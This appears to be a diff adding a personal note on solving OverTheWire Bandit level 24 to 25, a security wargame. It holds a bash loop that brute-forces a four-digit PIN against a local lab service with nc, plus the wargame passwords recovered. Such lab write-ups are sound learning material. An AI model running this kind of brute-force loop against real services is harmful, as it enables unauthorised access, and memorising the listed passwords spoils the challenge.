@@ -1,0 +1,19 @@
+https://blogcompsci.wordpress.com/2014/11/25/bandit-level-24-%E2%86%92-level-25/
+
+but I change it to:
+
+#!/bin/bash
+
+b24pass='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
+for i in {0..9}{0..9}{0..9}{0..9}; do
+	timeout 1 bash -c "echo $b24pass' '$i | nc localhost 30002 >> /tmp/zhefeng_25_result"
+done
+
+Otherwise there could be a resource issue.
+
+run it and wait for 1000s
+
+sort zhefeng_25_result | uniq -u
+=> Correct!
+Exiting.
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
